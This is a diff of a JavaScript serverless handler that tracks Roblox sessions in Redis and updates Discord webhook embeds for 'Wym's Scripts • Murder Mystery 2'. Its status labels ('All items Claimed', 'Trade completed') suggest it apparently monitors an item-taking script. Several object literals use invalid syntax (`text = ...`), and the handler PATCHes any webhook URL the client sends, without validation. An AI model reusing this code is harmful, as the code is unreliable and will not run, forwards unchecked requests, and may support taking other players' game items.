@@ -1,13 +1,3 @@
-export default async function handler(req, res) {
-    // Force allow POST
-    if (req.method !== 'POST' && req.method !== 'GET') {
-        return res.status(405).json({ error: 'Use POST for updates' });
-    }
-
-    const body = req.body || {};
-    // Log this in Vercel Dashboard to see if Roblox is actually reaching it
-    console.log("Incoming request:", { action: body.action, msgId: body.msgId });
-
 import { Redis } from '@upstash/redis'
 
 const redis = new Redis({
@@ -16,11 +6,19 @@ const redis = new Redis({
 })
 
 export default async function handler(req, res) {
-    // Standardize body for Cron-job.org or Roblox requests
+    // 1. Fix the 405 error: Allow both GET (for browser tests) and POST (for Cron/Roblox)
+    if (req.method !== 'POST' && req.method !== 'GET') {
+        return res.status(405).json({ error: 'Method Not Allowed' });
+    }
+
+    // Standardize body parsing
     const body = req.body || {};
     const { msgId, webhookUrl, action } = body;
 
-    // 1. WATCHDOG: This runs EVERY time the URL is hit (by Cron or Roblox)
+    // Log every hit so you finally see something in Vercel Logs
+    console.log(`Incoming ${req.method} request - Action: ${action || 'check'}, ID: ${msgId || 'none'}`);
+
+    // 1. WATCHDOG: This runs EVERY time (Cron or Roblox)
     try {
         const keys = await redis.keys('hb_*');
         for (const key of keys) {
@@ -28,6 +26,7 @@ export default async function handler(req, res) {
             
             // Check if player hasn't pinged in over 70 seconds
             if (data && (Date.now() - data.lastSeen > 70000)) {
+                console.log(`Watchdog: Marking ${data.msgId} as Red (Timed out)`);
                 await fetch(`${data.webhookUrl}/messages/${data.msgId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
@@ -35,7 +34,7 @@ export default async function handler(req, res) {
                         embeds: [{
                             title: "Wym's Scripts • Murder Mystery 2",
                             description: "## Status:\n```lua\n🔴 Left (Player Left Or Crashed)```",
-                            color: 16711680, // Red
+                            color: 16711680,
                             footer: { text = "Auto-detected departure via Cron" }
                         }]
                     })
@@ -48,7 +47,7 @@ export default async function handler(req, res) {
         console.error("Watchdog error:", err);
     }
 
-    // 2. LIVE UPDATES: Handle specific actions from the Roblox Script
+    // 2. LIVE UPDATES: Handle status changes from Roblox
     if (msgId && webhookUrl) {
         let embedUpdate = null;
 
@@ -56,17 +55,16 @@ export default async function handler(req, res) {
             embedUpdate = {
                 title: "Wym's Scripts • Murder Mystery 2",
                 description: "## Status:\n```lua\n🟡 Partial (Not All items taken)```",
-                color: 16776960, // Yellow
+                color: 16776960,
                 footer: { text = "Partial Progress" }
             };
         } else if (action === "stop") {
             embedUpdate = {
                 title: "Wym's Scripts • Murder Mystery 2",
                 description: "## Status:\n```lua\n🟢 Success (All items Claimed)```",
-                color: 65280, // Green
+                color: 65280,
                 footer: { text = "Trade completed successfully!" }
             };
-            // Delete from Redis immediately so Cron doesn't turn it Red
             await redis.del(`hb_${msgId}`);
         }
 
@@ -79,10 +77,11 @@ export default async function handler(req, res) {
         }
     }
 
-    // 3. HEARTBEAT: Keep session alive
+    // 3. HEARTBEAT: Update Redis to stay "Green"
     if (action === "ping" && msgId && webhookUrl) {
         await redis.set(`hb_${msgId}`, { msgId, webhookUrl, lastSeen: Date.now() }, { ex: 3600 });
     } 
 
+    // Always return 200 so Cron-job.org stays active
     return res.status(200).json({ ok: true, watchdog_active: true });
 }
